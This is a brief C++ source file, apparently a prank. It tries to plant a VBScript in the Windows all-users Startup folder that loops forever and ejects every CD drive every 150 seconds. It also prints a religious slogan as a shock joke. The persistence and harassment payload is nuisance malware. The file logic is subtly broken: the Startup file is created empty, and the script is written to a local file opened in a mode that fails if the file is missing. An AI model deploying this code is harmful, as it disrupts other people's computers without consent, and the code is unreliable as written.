#include <iostream>
#include <fstream>

using namespace std;

int main()
{
	fstream script;
	ofstream outfile("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script.vbs");
	script.open("script.vbs", ios::in | ios::out);

	script << "do \nDim ts \nDim strDriveLetter \nDim intDriveLetter \nDim fs 'As Scripting.FileSystemObject \nConst CDROM = 4 \nOn Error Resume Next \nSet fs = CreateObject(\"Scripting.FileSystemObject\")" << endl;
	script << "strDriveLetter = \"\"\nFor intDriveLetter = Asc(\"A\") To Asc(\"Z\")\nErr.Clear\nIf fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then\nIf Err.Number = 0 Then\nstrDriveLetter = Chr(intDriveLetter)" << endl;
	script << "Exit For\nEnd If\nEnd If\nNext\nSet oWMP = CreateObject(\"WMPlayer.OCX.7\" )\nSet colCDROMs = oWMP.cdromCollection\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null" << endl;
	script << "For d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nset owmp = nothing\nset colCDROMs = nothing\nWScript.Sleep 150000\nloop\n" << endl; // 600 000 - 10 min
	
	cout << "allah akbar" << endl;

	script.close();
	cin.get();
	cin.get();
}
